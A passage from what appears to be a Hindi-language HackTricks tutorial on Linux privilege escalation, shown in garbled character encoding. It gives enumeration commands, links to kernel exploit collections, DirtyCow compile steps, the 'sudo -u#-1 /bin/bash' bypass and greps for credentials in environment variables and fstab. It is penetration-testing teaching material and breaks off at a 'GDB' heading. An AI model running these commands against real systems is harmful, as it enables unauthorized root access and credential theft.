# рд▓рд┐рдирдХреНрд╕ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдФрд░ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдХреЛ** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## рд╕рд┐рд╕реНрдЯрдо рд╕реВрдЪрдирд╛

### рдУрдПрд╕ рд╕реВрдЪрдирд╛

рдЖрдЗрдП рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдУрдПрд╕ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдХреА рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ред
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### рдкрде

рдпрджрд┐ рдЖрдкрдХреЛ `PATH` рдЪрд░ рдореЗрдВ рдХрд┐рд╕реА рднреА рдлреЛрд▓реНрдбрд░ рдкрд░ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐ рд╣реИ рддреЛ рдЖрдкрдХреЛ рдХреБрдЫ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ:
```bash
echo $PATH
```
### рд╡рд╛рддрд╛рд╡рд░рдг рд╕реВрдЪрдирд╛

рдХреНрдпрд╛ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА, рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ API рдХреБрдВрдЬреА рд╣реИрдВ?
```bash
(env || set) 2>/dev/null
```
### рдХрд░реНрдиреЗрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕

рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ рдпрджрд┐ рдХреЛрдИ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реИ рдЬреЛ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
рдЖрдк рдПрдХ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╡рдВрд╢рд╡рд╛рджреА рдХрд░реНрдиреЗрд▓ рд╕реВрдЪреА рдФрд░ рдХреБрдЫ рдкрд╣рд▓реЗ рд╕реЗ **рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕** рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) рдФрд░ [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
рдЕрдиреНрдп рд╕рд╛рдЗрдЯ рдЬрд╣рд╛рдВ рдЖрдк рдХреБрдЫ **рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдП рдЧрдП рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

рдЙрд╕ рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рд╕рднреА рд╡рдВрд╢рд╡рд╛рджреА рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
рдЙрдкрдХрд░рдг рдЬреЛ рдХрд░реНрдиреЗрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдХреА рдЦреЛрдЬ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (рдХреБрд░реНрдмрд╛рди рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ, рдХрд░реНрдиреЗрд▓ 2.x рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ)

рд╣рдореЗрд╢рд╛ **Google рдореЗрдВ рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ**, рд╢рд╛рдпрдж рдЖрдкрдХреЗ рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдХрд┐рд╕реА рдХрд░реНрдиреЗрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реЛ рдФрд░ рдлрд┐рд░ рдЖрдк рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдпрд╣ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╡реИрдз рд╣реИред

### CVE-2016-5195 (DirtyCow)

Linux рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ - Linux рдХрд░реНрдиреЗрд▓ <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### рд╕реБрдбреЛ рд╕рдВрд╕реНрдХрд░рдг

рдЬреЛ рднреА рд╕реБрдбреЛ рд╕рдВрд╕реНрдХрд░рдг рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╣реИрдВ, рдЙрд╕ рдкрд░ рдЖрдзрд╛рд░рд┐рдд:
```bash
searchsploit sudo
```
рдЖрдк рдЗрд╕ grep рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ sudo рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рд╕рдВрджреЗрд╣ рд╣реИред
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov рджреНрд╡рд╛рд░рд╛
```
sudo -u#-1 /bin/bash
```
### Dmesg рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рддреНрдпрд╛рдкрди рд╡рд┐рдлрд▓

рдЗрд╕ рднреЗрджрди рдХреЛ рдХреИрд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд╛ рдПрдХ **рдЙрджрд╛рд╣рд░рдг** рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП **HTB рдХреЗ smasher2 рдмреЙрдХреНрд╕** рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ
```bash
dmesg 2>/dev/null | grep "signature"
```
### рдЕрдзрд┐рдХ рд╕рд┐рд╕реНрдЯрдо рдЬрд╛рдВрдЪ
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## рд╡рд┐рднрд╛рдЬрди рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

### рдЧреНрд░рд╕реБрд░рдХреНрд╖рд╛
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### рдкреИрдХреНрд╕
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### рдПрдХреНрдЬрд╝реАрдХреНрдпреВрд╢реАрд▓реНрдб
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Address Space Layout Randomization) рдПрдХ security feature рд╣реИ рдЬреЛ рдХрд┐рд╕реА process рдХреЗ memory layout рдХреЛ randomize рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА attacker рдХреЛ exploit рдХрд░рдирд╛ рдореБрд╢реНрдХрд┐рд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

рдпрджрд┐ рдЖрдк рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## рдбреНрд░рд╛рдЗрд╡реНрд╕

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдХреНрдпрд╛ рдЕрдирдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**, рдХрд╣рд╛рдБ рдФрд░ рдХреНрдпреЛрдВред рдпрджрд┐ рдХреБрдЫ рдЕрдирдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдЖрдк рдЙрд╕реЗ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд┐рдЬреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## рдЙрдкрдпреЛрдЧреА рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░

рдЙрдкрдпреЛрдЧреА рдмрд╛рдЗрдирд░реА рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
рднреА рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ **рдХреЛрдИ рдХрдВрдкрд╛рдЗрд▓рд░ рд╕реНрдерд╛рдкрд┐рдд** рд╣реИред рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реИ рдЕрдЧрд░ рдЖрдкрдХреЛ рдХреЛрдИ рдХрд░реНрдгреЗрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛ рддреЛ рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛ рд╕реБрдЭрд╛рд╡рд┐рдд рд╣реИ рдорд╢реАрди рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ (рдпрд╛ рдПрдХ рд╕рдорд╛рди)ред
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдЧрдП рд╕рдВрд╡рд░реНрдгреАрдп рд╕реЙрдлреНрдЯрд╡реЗрдпрд░

**рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдЧрдП рдкреИрдХреЗрдЬ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреА рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЬрд╛рдБрдЪ** рдХрд░реЗрдВред рд╢рд╛рдпрдж рдХреЛрдИ рдкреБрд░рд╛рдирд╛ Nagios рд╕рдВрд╕реНрдХрд░рдг (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП) рд╣реЛ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ...\
рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдЕрдзрд┐рдХ рд╕рдВрджреЗрд╣рдкреВрд░реНрдг рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдЧрдП рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЬрд╛рдБрдЪ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдХреА рдЬрд╛рдПред
```bash
dpkg -l #Debian
rpm -qa #Centos
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдорд╢реАрди рдХрд╛ SSH рдПрдХреНрд╕реЗрд╕ рд╣реИ рддреЛ рдЖрдк **openVAS** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╢реАрди рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдкреБрд░рд╛рдиреЗ рдФрд░ рд╡рдВрд╢рдХрд░ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="info" %}
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпреЗ рдХрдорд╛рдВрдбреНрд╕ рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рджрд┐рдЦрд╛рдПрдВрдЧреЗ рдЬреЛ рдЕрдзрд┐рдХрд╛рдВрд╢рдд: рдЕрдлрд╝рд╛рд▓ рд╣реЛрдЧреА, рдЗрд╕рд▓рд┐рдП рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдЬреИрд╕реЗ OpenVAS рдпрд╛ рд╕рдорд╛рди рдЬреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдг рдЬреНрдЮрд╛рдд рджреБрд░реБрдкрдпреЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рд╡рдВрд╢рдХрд░ рд╣реИ_
{% endhint %}

## рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ

**рджреЗрдЦреЗрдВ рдХрд┐ рдХреМрди рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ** рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рд░рд╣реА рд╣реИрдВ рдФрд░ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдЬрд┐рддрдиреА рдЕрдзрд┐рдХ рдЕрдзрд┐рдХрд╛рд░** рд░рдЦрддреА рд╣реИ рдЬрд┐рддрдиреА рдЪрд╛рд╣рд┐рдП (рд╢рд╛рдпрдж рдПрдХ рдЯреЙрдордХреИрдЯ рдЬреЛ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реЛ?)
```bash
ps aux
ps -ef
top -n 1
```
рд╣рдореЗрд╢рд╛ **electron/cef/chromium debuggers** рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рдЪреЗрдХ рдХрд░реЗрдВ, рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд░реНрдЪрд╕реНрд╡ рдЙрдиреНрдирддрд┐ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **Linpeas** рдЗрд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ `--inspect` рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдкрд╣рдЪрд╛рдирддрд╛ рд╣реИред
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ **рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдмрд╛рдЗрдирд░реА рдкрд░ рдЕрдкрдиреЗ рд╡рд░реНрдЪрд╕реНрд╡ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**, рд╢рд╛рдпрдж рдЖрдк рдХрд┐рд╕реА рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ

рдЖрдк [**pspy**](https://github.com/DominicBreuker/pspy) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдХреЛрдИ рд╡рдВрд╢реНрдЪрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣реА рд╣реЛрдВ рдпрд╛ рдЬрдм рдХреБрдЫ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рдкреВрд░реА рд╣реЛрдВред

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдореЛрд░реА

рд╕рд░реНрд╡рд░ рдХреА рдХреБрдЫ рд╕реЗрд╡рд╛рдПрдВ **рдореЗрдореЛрд░реА рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕рд╣реЗрдЬрддреА рд╣реИрдВ**ред
рд╕рд╛рдорд╛рдиреНрдпрдд: рдЖрдкрдХреЛ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдореЗрдореЛрд░реА рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП **рд░реВрдЯ рд╡рд░реНрдЪрд╕реНрд╡** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЬрдм рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд░реВрдЯ рд╣реЛ рдФрд░ рдЕрдзрд┐рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЦреЛрдЬрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реЛрдВ рддреЛ рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИред
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ **рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЖрдк рдЕрдкрдиреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдореЗрдореЛрд░реА рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдЬрдХрд▓ рдЕрдзрд┐рдХрд╛рдВрд╢ рдорд╢реАрдиреЛрдВ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ ptrace рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреЗ** рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдбрдВрдк рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдлрд╝рд╛рдЗрд▓ _**/proc/sys/kernel/yama/ptrace\_scope**_ ptrace рдХреА рдкрд╣реБрдВрдЪ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИ:

* **kernel.yama.ptrace\_scope = 0**: рд╕рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдбреАрдмрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдЬрдм рддрдХ рдЙрдирдХрд╛ рдпреВрдЖрдИрдбреА рд╕рдорд╛рди рд╣реЛред рдпрд╣ ptracing рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рдерд╛ рдХрд╛ рдХреНрд▓рд╛рд╕рд┐рдХрд▓ рддрд░реАрдХрд╛ рд╣реИред
* **kernel.yama.ptrace\_scope = 1**: рдХреЗрд╡рд▓ рдПрдХ рдорд╛рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбреАрдмрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **kernel.yama.ptrace\_scope = 2**: рдХреЗрд╡рд▓ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ ptrace рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ CAP\_SYS\_PTRACE рдХреНрд╖рдорддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
* **kernel.yama.ptrace\_scope = 3**: рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ ptrace рдХреЗ рд╕рд╛рде рдЯреНрд░реЗрд╕ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдПрдХ рдмрд╛рд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, ptracing рдХреЛ рдлрд┐рд░ рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреБрдирд░рд╛рд░рдВрдн рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
{% endhint %}

#### GDB

